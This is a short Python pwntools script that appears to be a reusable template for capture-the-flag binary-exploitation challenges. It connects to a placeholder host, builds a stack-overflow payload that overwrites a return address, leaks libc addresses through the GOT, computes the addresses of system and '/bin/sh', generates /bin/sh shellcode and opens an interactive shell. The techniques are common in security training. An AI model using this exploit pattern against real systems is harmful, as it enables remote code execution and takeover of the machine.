from pwn import *
from LibcSearcher import *
context.log_level="debug"
context(arch="amd64",os="linux")

conn = remote("IP_ADDR",IP_PORT)
conn.recvuntil("Input Something:")
conn.recvline("Input Something:")
conn.send("This is my data.")
conn.sendline("I'm gonna send a new line.")
conn.sendlineafter("Input Something:","Something")
data = conn.recv(4) # 4 Bytes Data in variable data

payload = b'0'*BUFFER_SIZE + p64(0) + p64(RETURN_ADDR)
conn.sendline(payload)
FUNC_ADDR = u64(conn.recv(8)) # Receive a x64 address

elf = ELF("./pwn_binary")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

shellcode = asm(shellcraft.sh())

libc = LibcSearcher("read",GOT_read) # read's address in GOT table
ADDR_LibC_base = GOT_read - libc.dump("read")
ADDR_system = ADDR_LibC_base + libc.dump("system")
ADDR_String_Sh = ADDR_LibC_base + libc.dump("str_bin_sh")

conn.interactive()
